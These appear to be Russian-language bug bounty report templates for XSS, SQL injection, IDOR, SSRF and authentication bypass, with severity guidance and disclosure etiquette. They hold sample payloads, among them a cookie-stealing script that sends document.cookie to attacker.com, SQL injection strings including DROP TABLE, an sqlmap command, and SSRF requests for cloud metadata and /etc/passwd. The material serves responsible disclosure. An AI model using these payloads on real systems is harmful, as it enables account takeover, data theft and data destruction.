```markdown
## Краткое описание

## Тип уязвимости
[XSS/SQLi/IDOR/SSRF/etc.] — тип уязвимости: XSS, SQLi, IDOR, SSRF и т. п.

## URL / конечная точка
`https://example.com/vulnerable-endpoint`

## Шаги воспроизведения
1. Шаг 1
2. Шаг 2
3. Шаг 3

## Последствия
[What an attacker can achieve] — чего может добиться атакующий
```

## 📝 Полный шаблон отчёта

### Формат заголовка
```
[Severity] [Vulnerability Type] в [Feature/Endpoint] приводит к [Impact]

Примеры:
- [Critical] SQL-инъекция в форме входа позволяет выгрузить базу данных
- [High] Хранимый XSS в комментариях позволяет захватить учётную запись
- [Medium] IDOR в /api/users/{id} раскрывает персональные данные других пользователей
```

## 🔥 Шаблоны по типам уязвимостей

### XSS — межсайтовый скриптинг (Cross-Site Scripting)

````markdown
## Краткое описание
Отражённый или хранимый XSS в [endpoint] позволяет атакующим выполнять
произвольный JavaScript в браузерах жертв.

## Полезная нагрузка
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

## Последствия
- Перехват сеанса путём кражи cookie
- Захват учётной записи
- Перехват нажатий клавиш
- Фишинговые атаки
- Распространение вредоносного ПО

## PoC
```javascript
// Перехватчик cookie
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>
```
````

### SQL-инъекция

````markdown
## Краткое описание
SQL-инъекция через [parameter] в [endpoint] позволяет извлекать содержимое базы данных.

## Полезная нагрузка
```sql
' OR '1'='1'--
' UNION SELECT username,password FROM users--
1; DROP TABLE users--
```

## Доказательства
- База данных: MySQL 8.0
- Извлечённые таблицы: users, orders, payments
- Доступно записей: 10,000+

## Команда SQLMap
```bash
sqlmap -u "https://example.com/page?id=1" --dbs --batch
```
````

### IDOR — небезопасная прямая ссылка на объект

```markdown
## Краткое описание
Уязвимость IDOR в [endpoint] позволяет получать доступ к [resource] других пользователей.

## Воспроизведение
1. Войти как пользователь A (ID: 100)
2. Обратиться к ресурсу: `GET /api/users/100/profile`
3. Заменить ID на 101: `GET /api/users/101/profile`
4. Убедиться, что возвращаются данные пользователя B

## Последствия
- Раскрытие персональных данных (имя, email, адрес)
- Доступны данные [X] пользователей
- Нарушение GDPR или требований к защите персональных данных

## Доказательства
| Запрос | Ответ |
|---------|----------|
| `/api/users/100` | Данные пользователя A ✓ |
| `/api/users/101` | Данные пользователя B ✗ |
| `/api/users/102` | Данные пользователя C ✗ |
```

### SSRF — подделка запросов на стороне сервера

````markdown
## Краткое описание
SSRF в [feature] позволяет отправлять запросы к внутренним сервисам.

## Полезная нагрузка
```
https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
https://example.com/fetch?url=http://localhost:6379/
https://example.com/fetch?url=file:///etc/passwd
```

## Доступные внутренние ресурсы
- Конечная точка метаданных AWS
- Внутренний сервер Redis
- Локальная файловая система

## Доказательства
```
HTTP/1.1 200 OK

ami-id: ami-12345678
instance-id: i-1234567890abcdef0
```
````

### Обход аутентификации

```markdown
## Краткое описание
Обход аутентификации в [feature] позволяет получить несанкционированный доступ к [resource].

## Способ обхода
[Describe the bypass technique] — описание техники обхода

## Воспроизведение
1. Обратиться к защищённой конечной точке без аутентификации
2. [Specific technique]
3. Доступ предоставлен

## Последствия
- Доступ к панели администратора
- Действия от имени другого пользователя
- Изменение данных
```

## 📊 Рекомендации по оценке критичности

### Критическая (P1)
```
- RCE — удалённое выполнение кода
- SQL-инъекция с извлечением данных
- Обход аутентификации с доступом администратора
- Полный захват учётной записи
- Манипуляции с платежами и финансовыми операциями
- Раскрытие персональных данных всех пользователей
```

### Высокая (P2)
```
- Хранимый XSS с существенными последствиями
- IDOR с доступом к конфиденциальным данным
- SSRF с доступом к внутренним сервисам
- Повышение привилегий
- Раскрытие конфиденциальных данных
```

### Средняя (P3)
```
- Отражённый XSS
- CSRF для критически важных действий
- Раскрытие информации
- Обход ограничения частоты запросов
- Фиксация сеанса
```

### Низкая (P4)
```
- Self-XSS — выполнение XSS в собственном сеансе
- IDOR без доступа к конфиденциальным данным
- Отсутствие защитных HTTP-заголовков
- Избыточно подробные сообщения об ошибках
- Определение существующих имён пользователей
```

## 💡 Практические советы

### Что следует делать ✅
```
✓ Писать понятно и кратко
✓ Включать все необходимые подробности
✓ Предоставлять рабочий PoC
✓ Объяснять последствия
✓ Предлагать способ устранения
✓ Общаться профессионально и уважительно
✓ Соблюдать согласованный порядок раскрытия
✓ Оперативно отвечать на вопросы
```

```
✗ Не обращаться к данным реальных пользователей
✗ Не проводить проверки в рабочей среде
✗ Не выходить за согласованные границы
✗ Не применять автоматические сканеры без разрешения
✗ Не раскрывать сведения до исправления
✗ Не оказывать давление при обсуждении вознаграждения
✗ Не отправлять дубликаты
✗ Не отправлять исключительно теоретические проблемы
```
